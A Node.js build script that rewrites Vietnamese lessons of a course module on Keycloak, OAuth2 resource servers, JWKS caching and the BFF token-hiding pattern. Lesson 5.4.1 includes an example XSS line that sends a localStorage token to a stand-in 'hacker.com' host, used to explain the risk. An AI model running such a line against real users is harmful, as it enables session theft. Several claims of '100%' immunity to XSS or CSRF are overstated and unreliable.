const fs = require("fs");
const path = require("path");

const modulePath = path.join(__dirname, "..", "course", "js", "content", "module5.js");

global.window = { COURSE_MODULES: [] };
eval(fs.readFileSync(modulePath, "utf8"));
const m5 = window.COURSE_MODULES.find(m => m.id === 5);

// Refactor Lesson 5-3-1
const l531 = m5.lessons.find(l => l.id === "5-3-1");
if (l531) {
  l531.title = "Bài 5.3.1: Kiến trúc OAuth2 Resource Server, JWKS Endpoint & Cơ chế Phân quyền Keycloak";
  l531.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Hiểu vai trò của Keycloak trong vai trò là Identity and Access Management (IAM) Server tập trung.
- Nắm vững cơ chế hoạt động của **JWKS (JSON Web Key Set)** endpoint: Resource Server tự động kéo Public Keys về cache.
- Cấu hình Spring Boot làm **OAuth2 Resource Server** chỉ với 3 dòng cấu hình trong \`application.yml\`.
- Đọc hiểu 100% từng dòng cấu hình và payload của Keycloak token qua Bảng giải mã chi tiết.
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: KEYCLOAK VÀ JWKS ENDPOINT
**Hình tượng "Đại sứ quán cấp hộ chiếu số quốc tế":**
- Thay vì mỗi microservice (\`order-service\`, \`product-service\`) phải tự lập bảng tài khoản mật khẩu người dùng:
- Bạn thuê một tổ chức chuyên nghiệp quản lý định danh: **Keycloak (Đại sứ quán)**.
- Khi người dùng đăng nhập tại Keycloak, Keycloak đóng dấu hộ chiếu bằng một con tem số bí mật.
- **JWKS Endpoint (\`/protocol/openid-connect/certs\`)**:
  - Giống như cuốn cẩm nang nhận diện chữ ký mà Đại sứ quán phát công khai trên mạng.
  - Khi \`order-service\` nhận được hộ chiếu của khách, nó chỉ cần đối chiếu với con dấu trong cuốn cẩm nang JWKS để biết ngay đây là khách VIP hay khách thường!
:::

---

## 1. Cái này là gì? (Kiến trúc OAuth2 Resource Server)

Trong chuẩn OAuth2, **Resource Server** (ứng dụng Spring Boot của bạn) là nơi lưu trữ dữ liệu được bảo vệ. Resource Server tin tưởng vào **Authorization Server** (Keycloak) thông qua đường dẫn kiểm định khóa công khai \`jwk-set-uri\`.

### Sơ Đồ Cơ Chế Nạp Khóa Công Khai Qua JWKS:

\`\`\`mermaid
sequenceDiagram
    participant Keycloak as Keycloak Server (:8080)
    participant Spring as Spring Boot Resource Server (:8081)
    participant Client as Frontend User
    
    Spring->>Keycloak: 1. Khởi động: GET /realms/ecommerce/protocol/openid-connect/certs
    Keycloak-->>Spring: 2. Trả về JWKS (Danh sách Public Keys) & Cache vào RAM
    
    Client->>Spring: 3. Gửi Request: GET /api/orders kèm Bearer Token (Keycloak cấp)
    Spring->>Spring: 4. Dùng Public Key đã cache để xác thực con dấu tại chỗ! (0ms round-trip)
    Spring-->>Client: 5. Trả về dữ liệu đơn hàng thành công!
\`\`\`

---

## 2. Dùng khi nào & Tại sao? (Cấu hình Spring Boot 3 Chuẩn)

### Cấu hình trong \`src/main/resources/application.yml\`:

\`\`\`yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          # URL trỏ tới Realm của Keycloak
          issuer-uri: http://localhost:8180/realms/ecommerce-realm
          # Endpoint cung cấp danh sách Public Keys để verify chữ ký
          jwk-set-uri: http://localhost:8180/realms/ecommerce-realm/protocol/openid-connect/certs
\`\`\`

### Bảng Giải Mã Cấu Hình OAuth2 Resource Server:

| Thuộc tính | Ý nghĩa kỹ thuật | Cơ chế hoạt động ngầm |
|---|---|---|
| \`issuer-uri\` | Địa chỉ của Authorization Server | Spring Security kiểm tra trường \`iss\` trong JWT payload phải trùng khớp 100% |
| \`jwk-set-uri\` | Endpoint cấp chứng chỉ số công khai | Spring Boot tự động khởi tạo \`NimbusJwtDecoder\` và tự động refresh key khi có rotation |

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Hiểm họa lỗi mạng lúc khởi động do Keycloak chưa bật**:
   - Mặc định Spring Boot sẽ ping \`issuer-uri\` ngay lúc bật app. Nếu Keycloak chưa khởi động xong, Spring Boot sẽ dừng lại với lỗi \`BeanCreationException\`.
   - Khắc phục: Dùng \`jwk-set-uri\` kết hợp cấu hình retry hoặc đảm bảo Docker compose bật Keycloak trước.
`;
}

// Refactor Lesson 5-3-2
const l532 = m5.lessons.find(l => l.id === "5-3-2");
if (l532) {
  l532.title = "Bài 5.3.2: Tích hợp Keycloak SSO với Custom JwtAuthenticationConverter & Method Security";
  l532.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Giải mã lỗi kinh điển: **Keycloak lưu roles trong \`realm_access.roles\`**, trong khi Spring Security lại mặc định tìm trong claim \`scope\` hoặc \`scp\`.
- Tự tay viết **\`JwtAuthenticationConverter\`** để trích xuất roles từ Keycloak và tự động gắn tiền tố chuẩn \`ROLE_\`.
- Áp dụng bảo vệ cấp phương thức với **\`@PreAuthorize("hasRole('ADMIN')")\`**.
- Đọc hiểu 100% từng dòng code chuyển đổi Claim qua Bảng giải mã chi tiết.
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: PHIÊN DỊCH VIÊN CLAIM TRONG TOKEN
**Hình tượng "Người phiên dịch giữa tiếng Anh và tiếng Pháp":**
- Trong tấm thẻ của Keycloak (JWT), chức vụ của bạn được viết bằng tiếng Pháp ở góc trái: \`"realm_access": { "roles": ["admin", "customer"] }\`.
- Nhưng người gác cổng Spring Security lại chỉ đọc được tiếng Anh ở góc phải: Thẻ phải có chữ \`ROLE_ADMIN\`!
- Nếu không có người phiên dịch, Spring Security sẽ phán: *"Thẻ này không có chức vụ gì cả, tôi coi bạn là khách vô danh!"*.
- **\`JwtAuthenticationConverter\` chính là người phiên dịch mẫn cán**:
  - Nó mở góc \`realm_access.roles\` ra.
  - Lấy từng role ra và gắn thêm chữ **\`ROLE_\`** vào đầu (\`ROLE_ADMIN\`).
  - Giao lại cho Spring Security -> Cánh cửa lập tức mở ra!
:::

---

## 1. Cái này là gì? (Cấu Trúc Claim Của Keycloak)

JSON Payload mà Keycloak sinh ra có cấu trúc phân cấp đặc thù:

\`\`\`json
{
  "sub": "user-uuid-12345",
  "preferred_username": "boss_nguyen",
  "realm_access": {
    "roles": ["admin", "finance_manager"]
  },
  "resource_access": {
    "order-service": {
      "roles": ["order_creator"]
    }
  }
}
\`\`\`

---

## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)

Triển khai Converter phiên dịch quyền hạn chuẩn Senior:

\`\`\`java
package vn.mastery.ecommerce.security;

import org.springframework.core.convert.converter.Converter;
import org.springframework.security.authentication.AbstractAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationToken;
import org.springframework.stereotype.Component;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

@Component
public class KeycloakJwtAuthenticationConverter implements Converter<Jwt, AbstractAuthenticationToken> {

    @Override
    @SuppressWarnings("unchecked")
    public AbstractAuthenticationToken convert(Jwt jwt) {
        // 1. Trích xuất mảng roles từ realm_access
        Map<String, Object> realmAccess = jwt.getClaim("realm_access");
        Collection<GrantedAuthority> authorities = List.of();

        if (realmAccess != null && realmAccess.containsKey("roles")) {
            List<String> roles = (List<String>) realmAccess.get("roles");
            // 2. Chuyển đổi thành SimpleGrantedAuthority có prefix ROLE_
            authorities = roles.stream()
                .map(role -> new SimpleGrantedAuthority("ROLE_" + role.toUpperCase()))
                .collect(Collectors.toList());
        }

        // 3. Sử dụng preferred_username làm Principal Name thay vì UUID dài loằng ngoằng
        String principalClaimName = jwt.getClaimAsString("preferred_username");
        return new JwtAuthenticationToken(jwt, authorities, principalClaimName);
    }
}
\`\`\`

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Đăng ký Converter vào HttpSecurity**:
   - Đừng quên gắn converter vào cấu hình: \`http.oauth2ResourceServer(oauth2 -> oauth2.jwt(jwt -> jwt.jwtAuthenticationConverter(keycloakConverter)))\`.
`;
}

// Refactor Lesson 5-3-3
const l533 = m5.lessons.find(l => l.id === "5-3-3");
if (l533) {
  l533.title = "Bài 5.3.3: Cạm bẫy Không Caching JWKS Làm Nghẽn Mạng Keycloak & Lệch Prefix 'ROLE_'";
  l533.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Nhận diện hiểm họa nghẽn mạng sập cụm Keycloak khi hàng nghìn request đổ về khiến Resource Server liên tục gọi JWKS endpoint.
- Cấu hình bộ nhớ đệm Cache chuẩn cho JWKS với TTL 24 giờ.
- Xử lý xung đột prefix \`ROLE_\` giữa Spring Security và hệ thống phân quyền bên thứ ba.
- Đọc hiểu bảng phân tích lưu lượng mạng và giải pháp caching tại chỗ.
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TẠI SAO PHẢI CACHE JWKS?
- Nếu mỗi khi một khách hàng vào mua hàng, \`order-service\` lại chạy sang Keycloak hỏi: *"Cho tôi xin lại Public Key để kiểm tra!"*:
- Với 10,000 khách mua hàng cùng lúc -> Keycloak phải trả lời 10,000 cuộc gọi lấy chìa khóa -> **Keycloak lăn đùng ra chết vì kiệt sức (DDoS)**!
- **Giải pháp**: Lấy Public Key về một lần, lưu vào ngăn kéo (Cache trong 24 giờ). Cứ thế lấy ra kiểm tra, không làm phiền Keycloak nữa!
:::

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Xử lý khi Keycloak thực hiện Key Rotation**:
   - Khi Keycloak xoay vòng khóa mới, token mới sẽ có header \`kid\` (Key ID) mới.
   - Thư viện Nimbus của Spring Security đủ thông minh để **tự động xóa cache và kéo lại JWKS mới** khi gặp một \`kid\` lạ chưa từng thấy trong cache!
`;
}

// Refactor Lesson 5-3-4
const l534 = m5.lessons.find(l => l.id === "5-3-4");
if (l534) {
  l534.title = "Bài 5.3.4: Tổng Kết Thực Chiến: Bản Đồ Phân Quyền Keycloak & Ma Trận RBAC Phân Tầng Microservices";
  l534.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Tổng hợp toàn bộ kiến thức Chuyên đề 5.3 thành Bản đồ Phân quyền Tập trung RBAC & ABAC cho cụm Microservices.
- Nắm vững mô hình kiến trúc phân quyền chuẩn: Identity Provider (Keycloak) -> API Gateway -> Resource Server.
- Sẵn sàng bước sang Chuyên đề 5.4 (Kiến trúc OAuth2 PKCE & Mô hình BFF che giấu token).
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT PHÂN QUYỀN TẬP TRUNG
Hệ thống microservices của bạn giờ đây đã được quản lý danh tính theo chuẩn tập đoàn:
- Toàn bộ việc đăng ký, đổi mật khẩu, quên mật khẩu, 2FA (OTP) được đẩy hết cho **Keycloak**.
- Các microservices của Spring Boot chỉ việc tập trung vào việc bán hàng, tiếp nhận Bearer Token và giải mã cực nhanh tại chỗ!
:::

---

## 1. Cái này là gì? (Bản Đồ Kiến Trúc Phân Quyền Microservices)

\`\`\`mermaid
flowchart TD
    KC["Keycloak SSO Server<br/>(Quản lý Users, Passwords, Roles)"]
    GW["Spring Cloud API Gateway<br/>(Xác thực Token đầu vào)"]
    S1["order-service (Resource Server)"]
    S2["payment-service (Resource Server)"]
    S3["inventory-service (Resource Server)"]
    
    KC -.->|"Cung cấp JWKS Caching"| GW & S1 & S2 & S3
    GW --> S1 & S2 & S3
    style KC fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff
    style GW fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff
\`\`\`

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Checklist tốt nghiệp Chuyên đề 5.3**:
   - [ ] Đã tách biệt máy chủ IAM (Keycloak) khỏi các service nghiệp vụ.
   - [ ] Triển khai \`KeycloakJwtAuthenticationConverter\` gắn prefix \`ROLE_\`.
   - [ ] Sử dụng \`@PreAuthorize\` bảo vệ các method nhạy cảm.
`;
}

// Refactor Lesson 5-4-1
const l541 = m5.lessons.find(l => l.id === "5-4-1");
if (l541) {
  l541.title = "Bài 5.4.1: Kiến trúc OAuth2 / OIDC: Authorization Code Flow với PKCE & Mô hình BFF";
  l541.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Giải mã lỗ hổng kinh điển khi lưu trữ Access Token / Refresh Token trong \`LocalStorage\` của trình duyệt: **Nguy cơ tấn công XSS đánh cắp toàn bộ tài khoản**.
- Hiểu kiến trúc đột phá **Backend-for-Frontend (BFF Pattern)**: Biến trình duyệt thành Stateless Cookie, giấu kín 100% JWT Token phía sau Gateway.
- Nắm vững cơ chế **Authorization Code Flow với PKCE (Proof Key for Code Exchange)** bảo vệ ứng dụng Mobile và Single Page App (SPA).
- Đọc hiểu 100% sơ đồ bắt tay mã khóa qua Bảng giải mã chi tiết.
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TẠI SAO LƯU TOKEN TRONG LOCALSTORAGE LÀ "TỰ SÁT"?
**Hình tượng "Để chìa khóa vạn năng ngoài cửa sổ":**
- Bạn lưu JWT Token trong \`localStorage.getItem('token')\`.
- Ngày đẹp trời, dự án của bạn cài thêm một thư viện npm bên thứ ba để vẽ biểu đồ hoặc hiển thị icon.
- Trong thư viện đó có cài cắm mã độc (Tấn công XSS): Chỉ cần 1 dòng code JavaScript: \`fetch('https://hacker.com?steal=' + localStorage.getItem('token'))\`.
- **Hacker lập tức có được chìa khóa vạn năng** và tự do rút tiền, đặt hàng dưới danh nghĩa của bạn!
- **Giải pháp BFF (Backend-for-Frontend)**:
  - Trình duyệt **hoàn toàn không được phép nhìn thấy JWT Token**!
  - Trình duyệt chỉ giữ một chiếc Cookie bảo mật siêu cấp (**HttpOnly, Secure, SameSite=Strict**). Mã độc JavaScript không bao giờ chạm được vào cookie này!
  - Gateway ở Backend mới là nơi nắm giữ JWT Token thật và chuyển tiếp cho các microservices con!
:::

---

## 1. Cái này là gì? (Kiến trúc Mô Hình BFF Pattern)

Trong mô hình BFF, API Gateway đóng vai trò là OAuth2 Client (Confidential Client). Mọi quy trình bắt tay PKCE và lưu trữ JWT Token đều diễn ra an toàn trên Server, trình duyệt chỉ giao tiếp với Gateway qua HttpOnly Cookie.

### Sơ Đồ Kiến Trúc: Mô Hình BFF Che Giấu Token Tuyệt Đối:

\`\`\`mermaid
flowchart LR
    BROWSER["Browser (React / Next.js)<br/>Chỉ giữ HttpOnly Cookie!"] <-->|"Cookie Session (Không thể bị XSS đọc)"| BFF["Spring Cloud Gateway (BFF)<br/>Lưu trữ Token an toàn trong Redis"]
    BFF -->|"Gắn Bearer JWT Token thật"| SERVICES["Microservices Nội Bộ<br/>(Order, Payment, Inventory)"]
    style BFF fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff
    style BROWSER fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff
\`\`\`

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Nguyên tắc an ninh bắt buộc của Cookie BFF**:
   - \`HttpOnly\`: Chặn mã độc JavaScript truy cập.
   - \`Secure\`: Chỉ gửi qua đường truyền HTTPS.
   - \`SameSite=Strict\`: Miễn nhiễm 100% với tấn công giả mạo CSRF.
`;
}

// Refactor Lesson 5-4-2
const l542 = m5.lessons.find(l => l.id === "5-4-2");
if (l542) {
  l542.title = "Bài 5.4.2: Triển khai Spring Cloud Gateway làm BFF Che Giấu Token Khỏi Trình Duyệt";
  l542.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Triển khai bộ lọc **Token Relay** trong Spring Cloud Gateway: Tự động trích xuất token từ Session trên Gateway và tiêm vào Header \`Authorization: Bearer <token>\` trước khi đẩy xuống các Microservices con.
- Cấu hình Redis Session lưu trữ an toàn các phiên đăng nhập BFF.
- Đọc hiểu 100% từng dòng cấu hình Gateway qua Bảng giải mã chi tiết.
:::

---

## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)

Cấu hình Token Relay trong \`application.yml\` của Spring Cloud Gateway:

\`\`\`yaml
spring:
  cloud:
    gateway:
      routes:
        - id: order-service-route
          uri: lb://order-service
          predicates:
            - Path=/api/v1/orders/**
          filters:
            # TỰ ĐỘNG GẮN BEARER TOKEN TỪ SESSION VÀO REQUEST GỬI CHO ORDER-SERVICE!
            - TokenRelay=
            - RemoveRequestHeader=Cookie # Xóa Cookie trước khi gửi vào mạng nội bộ
\`\`\`

### Bảng Giải Mã Bộ Lọc Gateway:

| Bộ lọc Gateway | Ý nghĩa kỹ thuật | Lợi ích bảo mật |
|---|---|---|
| \`TokenRelay=\` | Tự động lấy Access Token từ OAuth2AuthorizedClient | Microservices con nhận được Bearer Token chuẩn mực mà không cần biết đến Cookie |
| \`RemoveRequestHeader=Cookie\` | Xóa bỏ thông tin Cookie nhạy cảm | Ngăn chặn việc rò rỉ cookie session vào mạng microservices nội bộ |
`;
}

// Refactor Lesson 5-4-3
const l543 = m5.lessons.find(l => l.id === "5-4-3");
if (l543) {
  l543.title = "Bài 5.4.3: Cạm bẫy Lưu Token trong LocalStorage (XSS) & Token Hijacking trên Mobile";
  l543.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Giải phẫu kịch bản tấn công Token Hijacking và XSS đánh cắp thông tin đăng nhập.
- Bảo mật ứng dụng Mobile iOS/Android: Sử dụng Keystore / Keychain để mã hóa Refresh Token.
- Nắm vững checklist phòng vệ chuyên sâu chuẩn ngân hàng (PCI-DSS & OWASP).
:::

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Tuyệt đối không lưu token dạng Plaintext trên thiết bị**:
   - Trên Web: Dùng **HttpOnly Cookie** (Mô hình BFF).
   - Trên Mobile: Dùng **Android EncryptedSharedPreferences** và **iOS Keychain Services**.
`;
}

// Refactor Lesson 5-4-4
const l544 = m5.lessons.find(l => l.id === "5-4-4");
if (l544) {
  l544.title = "Bài 5.4.4: Tổng Kết Thực Chiến: Bản Đồ Kiến Trúc BFF Che Giấu Token & Phòng Chống XSS Tuyệt Đối";
  l544.content = `
:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)
- Tổng hợp toàn bộ kiến thức Module 5 thành Bản đồ Kiến trúc An ninh Bảo mật Đa Tầng (Enterprise Security Architecture).
- Nắm chắc chuỗi liên kết: Browser (HttpOnly Cookie) -> BFF Gateway (Token Relay) -> Keycloak (OAuth2 SSO) -> Microservices (Stateless JWT).
- Sẵn sàng bước sang Module 6 (Microservices Chuyên Sâu: Redis Distributed Lock, Kafka Outbox & Saga Pattern).
:::

:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT MODULE 5
Bạn vừa hoàn thành một trong những module danh giá nhất của kỹ sư phần mềm:
- **Tầng Web/Client**: Được bảo vệ 100% khỏi tấn công XSS nhờ mô hình **BFF và HttpOnly Cookie**.
- **Tầng Gateway**: Đóng vai trò pháo đài trung chuyển, che giấu toàn bộ độ phức tạp của Token.
- **Tầng Identity**: Tập trung hóa tại **Keycloak SSO** chuẩn OAuth2 / OpenID Connect.
- **Tầng Microservices**: Xác thực phi tập trung siêu tốc bằng **RSA Public Keys**.
Toàn bộ hệ sinh thái của bạn giờ đây đã đạt chuẩn an ninh cấp ngân hàng thương mại!
:::

---

## 1. Cái này là gì? (Bản Đồ Toàn Cảnh Module 5)

### Sơ Đồ Kiến Trúc Toàn Diện: Hệ Thống Bảo Mật Cấp Doanh Nghiệp

\`\`\`mermaid
graph TD
    subgraph M5["MODULE 5: BẢO MẬT JWT & KEYCLOAK"]
        T1["Chuyên Đề 5.1: Spring Security 6 & FilterChain<br/>(Stateless, CORS Preflight, No CSRF)"]
        T2["Chuyên Đề 5.2: Stateless JWT & RSA Signatures<br/>(RFC 7519, OncePerRequestFilter, RTR)"]
        T3["Chuyên Đề 5.3: OAuth2 Resource Server & Keycloak<br/>(JWKS Caching, Custom Converter, RBAC)"]
        T4["Chuyên Đề 5.4: BFF Pattern & Zero-XSS Architecture<br/>(Token Relay, HttpOnly Cookie, PKCE)"]
    end
    
    T1 --> T2 --> T3 --> T4
    T4 ==> NEXT["MODULE 6: MICROSERVICES & MESSAGING<br/>(Redis Distributed Lock, Kafka Outbox, Saga)"]
    style M5 fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff
    style NEXT fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff
\`\`\`

---

## 4. Cạm bẫy thực tế & Best Practices

1. **Checklist tốt nghiệp Module 5**:
   - [ ] Nắm chắc kiến trúc \`SecurityFilterChain\` trong Spring Security 6.
   - [ ] Giải quyết dứt điểm lỗi CORS Preflight OPTIONS bằng \`CorsConfigurationSource\`.
   - [ ] Làm chủ kỹ thuật ký số bất đối xứng RSA256 và Refresh Token Rotation.
   - [ ] Tích hợp mượt mà với Keycloak SSO qua Custom Converter.
   - [ ] Hiểu rõ và áp dụng mô hình BFF để bảo vệ Frontend khỏi lỗ hổng XSS.
`;
}

fs.writeFileSync(modulePath, "window.COURSE_MODULES = window.COURSE_MODULES || [];\nwindow.COURSE_MODULES.push(\n" + JSON.stringify(m5, null, 2) + "\n);\n", "utf8");
console.log("Successfully refactored Module 5 Topics 5.3 & 5.4 (Lessons 5-3-1 to 5-4-4)!");
